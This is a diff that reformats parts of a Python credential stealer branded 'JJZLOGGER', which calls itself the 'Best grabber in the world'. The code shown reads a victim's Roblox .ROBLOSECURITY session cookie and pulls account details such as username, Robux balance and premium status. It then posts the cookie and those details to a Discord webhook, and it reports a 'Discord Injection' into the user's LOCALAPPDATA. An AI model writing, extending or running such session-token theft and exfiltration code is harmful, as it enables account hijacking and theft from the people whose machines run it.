@@ -30,9 +30,9 @@ roblox = get() or "No Roblox Cookie Found"
 
 
 headers = {
-   'Cookie': '.ROBLOSECURITY=' + roblox,
-   'User-Agent': 'Roblox/WinInet',
-   'Referer': 'https://www.roblox.com/'
+    'Cookie': f'.ROBLOSECURITY={roblox}',
+    'User-Agent': 'Roblox/WinInet',
+    'Referer': 'https://www.roblox.com/',
 }
 
 jjz = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers).json()
@@ -51,22 +51,52 @@ data = {
             "url": "https://pornhub.com",
             "description": "",
             "color": 3447704,
-            "thumbnail": {"url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"},
+            "thumbnail": {
+                "url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
+            },
             "author": {
                 "name": "Roblox Shit ig lmao idfk",
-                "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662"
+                "icon_url": "https://media.discordapp.net/attachments/1096445743524499596/1097304300046258207/IMG_7404.png?width=1192&height=662",
             },
             "fields": [
-                {"name": "Roblox Cookie 🍪", "value": "```" + roblox + "```", "inline": False},
-                {"name": "Username 🪪", "value": "```" + str(username) + "```", "inline": True},
-                {"name": "Premium 💎", "value": "```" + str(premium) + "```", "inline": True},
-                {"name": "ID 🪪", "value": "```" + str(user_id) + "```", "inline": True},
-                {"name": "Robux 💰", "value": "```" + str(robux_balance) + "```", "inline": True},
-                {"name": "RAP 💰", "value": "```" + str(rap) + "```", "inline": True},
-                {"name": "Creation 📆", "value": "```" + str(creation) + "```", "inline": True},
-            ]
+                {
+                    "name": "Roblox Cookie 🍪",
+                    "value": f"```{roblox}```",
+                    "inline": False,
+                },
+                {
+                    "name": "Username 🪪",
+                    "value": f"```{str(username)}```",
+                    "inline": True,
+                },
+                {
+                    "name": "Premium 💎",
+                    "value": f"```{str(premium)}```",
+                    "inline": True,
+                },
+                {
+                    "name": "ID 🪪",
+                    "value": f"```{str(user_id)}```",
+                    "inline": True,
+                },
+                {
+                    "name": "Robux 💰",
+                    "value": f"```{str(robux_balance)}```",
+                    "inline": True,
+                },
+                {
+                    "name": "RAP 💰",
+                    "value": f"```{str(rap)}```",
+                    "inline": True,
+                },
+                {
+                    "name": "Creation 📆",
+                    "value": f"```{str(creation)}```",
+                    "inline": True,
+                },
+            ],
         }
-    ]
+    ],
 }
 
 headers = {'Content-type': 'application/json'}
@@ -177,10 +207,16 @@ def kill_discord():
 embed = {
     "title": "💉 Discord Injection - JJZLOGGER 💉",
     "color": 3447704,
-    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
+    "thumbnail": {
+        "url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"
+    },
     "fields": [
-        {"name": "Injection Status", "value": f"```Discord Has been Injected in LOCALAPPDATA```", "inline": False},
-    ]
+        {
+            "name": "Injection Status",
+            "value": "```Discord Has been Injected in LOCALAPPDATA```",
+            "inline": False,
+        }
+    ],
 }
 
 response = requests.post(webhook, json={"embeds": [embed]})
@@ -192,10 +228,16 @@ kill_discord()
 embed = {
     "title": "Note ✅",
     "color": 3447704,
-    "thumbnail": {"url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"},
+    "thumbnail": {
+        "url": "https://cdn.discordapp.com/attachments/123456789/123456789/image.png"
+    },
     "fields": [
-        {"name": "JJZ", "value": f"""```Best grabber in the world JJZ LOGGER
-JJZ ON TOP```""", "inline": False},
-    ]
+        {
+            "name": "JJZ",
+            "value": """```Best grabber in the world JJZ LOGGER
+JJZ ON TOP```""",
+            "inline": False,
+        }
+    ],
 }
 response = requests.post(webhook, json={"embeds": [embed]})
